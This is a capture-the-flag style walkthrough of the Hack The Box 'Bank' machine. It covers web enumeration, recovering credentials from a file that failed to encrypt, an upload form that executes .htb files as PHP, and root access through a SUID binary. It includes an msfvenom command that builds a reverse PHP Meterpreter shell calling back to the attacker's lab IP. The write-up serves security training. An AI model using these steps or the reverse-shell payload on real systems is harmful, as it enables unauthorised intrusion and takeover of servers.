# Bank

## **10 [th] October 2017 / Document No D17.100.15**

**Prepared By: Alexander Reid (Arrexel)**

**Machine Author: issue**

**Difficulty: Easy**

**Classification: Official**


Page 1 / 7


## **SYNOPSIS**

Bank is a relatively simple machine, however proper web enumeration is key to finding the

necessary data for entry. There also exists an unintended entry method, which many users find

before the correct data is located.


## **Skills Required**


  - Basic knowledge of Linux

  - Enumerating ports and services


## **Skills Learned**


  - Identifying vulnerable services

  - Exploiting SUID files


Page 2 / 7


## **Enumeration** **Nmap**

Nmap reveals OpenSSH, a DNS server and an Apache server. Apache is running the default web

page, and no information can be gained from the DNS server. In this case, Apache is using a

virtual host to route traffic. The hostname must be guessed on this machine ( **bank.htb** ) and then

added to **/etc/hosts** . The site first presents a login page, however it is not vulnerable.


Page 3 / 7


## **Dirbuster**

Dirbuster, with the lowercase medium wordlist, will find the **balance-transfer** directory after a

while. In it are many encrypted files which hold user credentials.


Page 4 / 7


## **Exploitation** **Intended Method**

Upon closer inspection, it becomes apparent that one of the files is much smaller than the others.

Opening **68576f20e9732f1b2edc4df5b8533230.acc** reveals valid login credentials due to a

failed encryption.


Using the credentials to log in, it appears that there is a file upload form on the **Support** page.

Inspecting the source code reveals that any file uploaded with the extension **.htb** is executed as

PHP.


It is trivial to get a shell at this stage. Generate a reverse PHP shell with **msfvenom -p**

**php/meterpreter/reverse_tcp lhost=<LAB IP> lport=<PORT> -f raw > writeup.htb** and upload it

using the form. According to the results from Dirbuster, the file should reside in the **uploads**

directory. Browse to **/uploads/writeup.htb** to execute the script.


Page 5 / 7


## **Unintended Method**

Using a combination of a few programming errors, it is possible to bypass **balance-transfer**

altogether. The **support.php** page does not redirect properly, and outputs the entire page

contents to unauthenticated users prior to redirecting to the login. It is possible to copy the form

HTML to a local file, set the target to the **support.php** page, and upload files without

authentication.


Page 6 / 7


## **Privilege Escalation**

LinEnum: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)


Running LinEnum reveals a non-standard SUID file; **/var/htb/bin/emergency** . Running the file

immediately grants root privileges. The flags can be obtained from **/home/chris/user.txt** and

**/root/root.txt**


Page 7 / 7


